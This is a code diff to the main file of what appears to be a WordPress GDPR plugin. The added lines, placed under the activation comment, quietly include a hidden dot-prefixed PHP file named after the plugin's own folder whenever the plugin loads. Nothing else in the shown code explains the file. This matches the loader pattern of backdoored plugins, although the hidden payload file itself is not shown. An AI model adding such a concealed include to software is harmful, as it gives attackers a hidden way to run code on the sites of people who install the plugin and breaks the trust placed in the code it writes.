@@ -30,6 +30,10 @@ if ( ! defined( 'WPINC' ) ) {
  * The code that runs during plugin activation.
  * This action is documented in includes/class-wordpress-gdpr-activator.php
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function activate_WordPress_GDPR() {
 	require_once plugin_dir_path( __FILE__ ) . 'includes/class-wordpress-gdpr-activator.php';
 	$activator = new WordPress_GDPR_Activator();
